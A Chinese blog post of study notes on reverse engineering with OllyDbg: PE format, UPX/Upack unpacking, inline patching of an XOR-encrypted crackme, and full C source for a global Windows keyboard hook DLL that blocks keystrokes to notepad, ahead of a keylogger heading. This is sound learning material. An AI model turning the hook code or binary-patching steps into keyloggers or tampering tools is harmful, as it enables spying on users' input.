    <id>https://gift1a.github.io/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/</id>
    <published>2022-04-07T09:19:45.000Z</published>
    <updated>2022-04-15T06:33:10.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-调试Helloworld程序"><a href="#0x00-调试Helloworld程序" class="headerlink" title="0x00-调试Helloworld程序"></a>0x00-调试Helloworld程序</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649326083343.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649326142470.png"></p><p>选择Release模式生成的可执行文件能使程序代码更简洁，方便调试-之前我都是debug模式的，难怪有一堆初始化操作</p><blockquote><p>OD指令-Ctrl+F2，重新开始调试</p><p>​                Ctrl+F9，一直在函数代码内部运行，知道遇到retn，跳出函数</p><p>​                :可以给地址添加标签</p><p>​                Ctrl+E，编辑数据</p><p>​                空格，编写汇编代码</p></blockquote><h1 id="0x01-小端序标记法"><a href="#0x01-小端序标记法" class="headerlink" title="0x01-小端序标记法"></a>0x01-小端序标记法</h1><p>采用小端序时，地址高位存储数据的高位，地址低位存储数据的低位，我们知道一个地址最多存储一个字节的单元，也就是两个十六进制，那么0x12345678在内存存储中时则为78 56 34 12</p><h1 id="0x02-IA-32寄存器基本讲解"><a href="#0x02-IA-32寄存器基本讲解" class="headerlink" title="0x02-IA-32寄存器基本讲解"></a>0x02-IA-32寄存器基本讲解</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328781711.png" alt="通用寄存器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328919424.png" alt="寄存器作用"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328950871.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333035627.png" alt="段寄存器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333102096.png"></p><p>其中FS寄存器比较重要，用于计算SEH、TEB、PEB等地址</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333204894.png" alt="重要标志位"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333235729.png"></p><h1 id="0x03-栈"><a href="#0x03-栈" class="headerlink" title="0x03-栈"></a>0x03-栈</h1><p>栈的特征</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333398152.png" alt="栈的特征"></p><p>函数调用入栈顺序</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333596093.png"></p><h1 id="0x04-栈帧"><a href="#0x04-栈帧" class="headerlink" title="0x04-栈帧"></a>0x04-栈帧</h1><p>通过EBP-栈帧指针寄存器访问局部变量、参数、函数返回地址</p><p>函数开始时要先把已有值保存到栈中</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333832316.png"></p><p>指出相关内存属于哪个段</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334137175.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334312797.png" alt="返回值"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334395974.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334452555.png" alt="外平栈和内平栈"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334531491.png" alt="xor eax,eax"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334591186.png" alt="关闭段显示"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334796214.png" alt="函数的间接调用"></p><p>Test相当于&amp;命令，改变ZF的值</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334897963.png" alt="TEST指令"></p><h1 id="0x05-Process-Explorer"><a href="#0x05-Process-Explorer" class="headerlink" title="0x05-Process Explorer"></a>0x05-Process Explorer</h1><p>安装Peocess Explorer、sysinternals</p><h1 id="0x06-函数调用约定"><a href="#0x06-函数调用约定" class="headerlink" title="0x06-函数调用约定"></a>0x06-函数调用约定</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336046853.png" alt="cdecl"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336074342.png" alt="stdcall"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336102197.png" alt="stdcall"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336128921.png" alt="fastcall"></p><h1 id="0x07-鸡汤"><a href="#0x07-鸡汤" class="headerlink" title="0x07-鸡汤"></a>0x07-鸡汤</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336265323.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336281377.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336312616.png"></p><h1 id="0x08-PE文件格式"><a href="#0x08-PE文件格式" class="headerlink" title="0x08-PE文件格式"></a>0x08-PE文件格式</h1><p>相当于复习了</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649337195834.png" alt="RVA与VA"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649342412672.png" alt="映像"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649342725432.png" alt="显式链接与隐式链接"></p><h2 id="为什么要有导入表"><a href="#为什么要有导入表" class="headerlink" title="为什么要有导入表"></a>为什么要有导入表</h2><p>1、是因为不同版本的dll函数存放的地址也不同，为了能正常调用函数，编译器准备了存放函数实际地址的位置</p><p>2、重定位，多个dll无法同时装载到1000000h</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649343048380.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377368994.png" alt="导入表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377721063.png" alt="导入表结构"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377867593.png" alt="IAT输入顺序"></p><p>因为存在按序号导入也有按名称导入，所以获取函数起始地址的时候有两种方式</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649378338899.png" alt="程序运行中的IAT表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649379766533.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649379898617.png" alt="导出表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380029780.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380146114.png" alt="获取函数地址"></p><p>即通过函数名称导出：先去函数名称表依次比较，找到相同时，得到索引index，去导出序号表根据index取出里面的值作为新的索引index_new，再去函数地址表找到函数地址</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380438215.png" alt="按序号导出"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380791104.png" alt="patched PE"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381026465.png"></p><h1 id="0x09-运行时压缩"><a href="#0x09-运行时压缩" class="headerlink" title="0x09-运行时压缩"></a>0x09-运行时压缩</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381576476.png" alt="压缩器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381637551.png" alt="保护器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382063431.png" alt="保护器种类"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382125254.png" alt="upx加壳后的notepad.exe"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382165657.png"></p><h1 id="0x0A-调试UPX压缩的notepad程序"><a href="#0x0A-调试UPX压缩的notepad程序" class="headerlink" title="0x0A-调试UPX压缩的notepad程序"></a>0x0A-调试UPX压缩的notepad程序</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382397337.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382481059.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382514246.png" alt="OD跟踪命令"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382717431.png" alt="解码循环"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382768527.png" alt="恢复地址"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382833291.png" alt="IAT"></p><h1 id="0x0B-基址重定位表"><a href="#0x0B-基址重定位表" class="headerlink" title="0x0B-基址重定位表"></a>0x0B-基址重定位表</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391242570.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391309699.png" alt="ASLR"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391324972.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391676854.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470225805.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470309143.png" alt="重定位表中的地址计算"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470391830.png" alt="重定位表分块大小原因"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470561427.png" alt="重定位"></p><h1 id="0x0C-从可执行文件中删除重定位表"><a href="#0x0C-从可执行文件中删除重定位表" class="headerlink" title="0x0C-从可执行文件中删除重定位表"></a>0x0C-从可执行文件中删除重定位表</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470715916.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470727996.png" alt="步骤"></p><h1 id="0x0D-Upack-PE文件头详细分析"><a href="#0x0D-Upack-PE文件头详细分析" class="headerlink" title="0x0D-Upack PE文件头详细分析"></a>0x0D-Upack PE文件头详细分析</h1><h2 id="重叠文件头"><a href="#重叠文件头" class="headerlink" title="重叠文件头"></a>重叠文件头</h2><p>因为DOS头尾部有一堆垃圾数据，所以将其修改并去除垃圾数据并修改e_lfanew，可以实现文件头重叠</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471521418.png"></p><h2 id="IMAGE-FILE-HEADER-SizeofOptionalHeader"><a href="#IMAGE-FILE-HEADER-SizeofOptionalHeader" class="headerlink" title="IMAGE_FILE_HEADER.SizeofOptionalHeader"></a>IMAGE_FILE_HEADER.SizeofOptionalHeader</h2><p>通过修改可选PE头的大小，可以向文件头插入解码代码。</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471656793.png" alt="可选PE头存在的原因"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471692584.png"></p><h2 id="IMAGE-OPTINAL-HEADER-NumberOfRvaAndSizes"><a href="#IMAGE-OPTINAL-HEADER-NumberOfRvaAndSizes" class="headerlink" title="IMAGE_OPTINAL_HEADER.NumberOfRvaAndSizes"></a>IMAGE_OPTINAL_HEADER.NumberOfRvaAndSizes</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471789389.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471971897.png"></p><h2 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472047897.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472187949.png" alt="UPcak的重叠特征"></p><p>也就是说Upack先将notepad.exe压缩至第二个节区，运行时将第二个节区的代码解压至第一个节区</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472217512.png" alt="解压后的第一个节区"></p><h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472407155.png"></p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472531391.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472588438.png"></p><h2 id="导入地址表"><a href="#导入地址表" class="headerlink" title="导入地址表"></a>导入地址表</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472781271.png"></p><h1 id="0x0E-Upack调试-查找OEP"><a href="#0x0E-Upack调试-查找OEP" class="headerlink" title="0x0E-Upack调试-查找OEP"></a>0x0E-Upack调试-查找OEP</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473884976.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473962763.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473977290.png"></p><h1 id="0x0F-内嵌补丁"><a href="#0x0F-内嵌补丁" class="headerlink" title="0x0F-内嵌补丁"></a>0x0F-内嵌补丁</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474031264.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474156707.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474124006.png" alt="内嵌补丁与代码补丁的区别"></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>先对附件进行分析</p><p>弹出的对话框要求解压其本身</p><p>对地址4010F5的第一次异或</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482257261.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482352736.png" alt="401007地址的值异或7"></p><p>再次对4010F5进行异或操作，解密</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482387580.png"></p><p>可以看到这里对地址的值进行校验，每次取出四个字节相加，所以当我们修改了内容时需要对校验部分修改</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482453215.png" alt="校验"></p><p>所以解码完的部分存在我们要找的字符串</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482646487.png"></p><p>对401090地址的值进行异或</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482685919.png" alt="异或"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482728534.png" alt="大致流程"></p><h2 id="内嵌补丁练习"><a href="#内嵌补丁练习" class="headerlink" title="内嵌补丁练习"></a>内嵌补丁练习</h2><p>因为我们要打补丁的字符串位于B区，而B区进行了双重加密，而且对其内容进行了校验，所以采用内嵌补丁</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482908373.png" alt="内嵌补丁"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649483145646.png"></p><p>因为节区要对齐，所以可能存在空白节区，那我们就可以在节区末尾添加我们的洞穴代码</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484195488.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484706889.png"></p><p>然后让程序先跳转到我们这个地址，再在这段代码最后一句，加上跳回原本程序的代码</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484859772.png" alt="程序原本的跳转"></p><p>但是要注意一点，就是我们插入的是已经解完密的jmp，而实际在文件中，这里的jmp是被加密的，所以要先对我们的修改进行加密，也就是xor 7</p><h1 id="0x10-Windows消息钩取"><a href="#0x10-Windows消息钩取" class="headerlink" title="0x10-Windows消息钩取"></a>0x10-Windows消息钩取</h1><p>windows消息机制</p><p><a href="https://blog.csdn.net/alzzw/article/details/108217879">https://blog.csdn.net/alzzw/article/details/108217879</a></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649486465228.png" alt="windows消息流"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649486637330.png" alt="消息钩取工作原理"></p><p>我们设置的钩子能在应用程序之前获取到OS相应信息</p><blockquote><p>SetwindowsHookEx()</p><p>HHOOK SetWindowsHookExA(<br>  [in] int       idHook,// 要安装的挂钩过程的类型<br>  [in] HOOKPROC  lpfn,// 指向挂钩过程的指针<br>  [in] HINSTANCE hmod,// 所指向的挂钩过程的 DLL 的句柄<br>  [in] DWORD     dwThreadId<br>);</p></blockquote><p>main.cpp</p><pre class="language-c" data-language="c"><code class="language-c">#include "stdio.h"#include "conio.h"#include "windows.h"#define    DEF_DLL_NAME        "KeyHook.dll"#define    DEF_HOOKSTART        "HookStart"#define    DEF_HOOKSTOP        "HookStop"typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main(){    HMODULE    hDll = NULL;    PFN_HOOKSTART    HookStart = NULL;    PFN_HOOKSTOP    HookStop = NULL;    char    ch = 0;    // 加载KeyHook.dll    hDll = LoadLibraryA(DEF_DLL_NAME);    if (hDll == NULL)    {        printf("LoadLibrary(%s) failed!!! [%d]", DEF_DLL_NAME, GetLastError());        return;    }    // 获取导出函数地址    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);    // 开始钩取    HookStart();    // 等待，直到用户输入“q”    printf("press 'q' to quit!\n");    while (_getch() != 'q');    // 终止钩子    HookStop();    // 卸载KeyHook.dll    FreeLibrary(hDll);}</code></pre><p>KeyHook.dll</p><pre class="language-c" data-language="c"><code class="language-c">//KeyHook.cpp #include "stdio.h"#include "windows.h" //定义目标进程名为notepad.exe#define DEF_PROCESS_NAME "notepad.exe" //定义全局变量HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL; //DllMain()函数在DLL被加载到进程后会自动执行BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved){switch( dwReason ){case DLL_PROCESS_ATTACH:g_hInstance = hinstDLL;break; case DLL_PROCESS_DETACH:break;} return TRUE;} //LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){char szPath[MAX_PATH] = {0,};char *p = NULL;if( nCode &gt;= 0 ){ //释放键盘按键时，bit 31 : 0 =&gt; press, 1 =&gt; releaseif( !(lParam &amp; 0x80000000) ){GetModuleFileNameA(NULL, szPath, MAX_PATH);p = strrchr(szPath, '\\'); //比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序或下一个钩子函数//_stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0if( !_stricmp(p + 1, DEF_PROCESS_NAME) ){return 1;}}} //比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数return CallNextHookEx(g_hHook, nCode, wParam, lParam);} //在C++中调用C的库文件，用extern "C"告知编译器，因为C++支持函数重载而C不支持，两者的编译规则不同#ifdef __cplusplusextern "C"{#endif//__declspec，针对编译器的关键字，用于指出导出函数//当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链__declspec(dllexport) void HookStart(){g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);} __declspec(dllexport) void HookStop(){if(g_hHook){UnhookWindowsHookEx(g_hHook);g_hHook = NULL;}}#ifdef __cplusplus}#endif</code></pre><p>调用导出函数HookStart()时，SetWindowsHookEx()函数就会把KeyboardProc()添加到键盘钩链</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649491980722.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492021056.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492216354.png" alt="调试过程"></p><h1 id="0x11-恶意键盘记录器"><a href="#0x11-恶意键盘记录器" class="headerlink" title="0x11-恶意键盘记录器"></a>0x11-恶意键盘记录器</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492949992.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649493348476.png" alt="DLL注入"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649493419347.png" alt="DLL_Main函数"></p><p><a href="https://blog.csdn.net/tiandao2009/article/details/79839182">https://blog.csdn.net/tiandao2009/article/details/79839182</a>  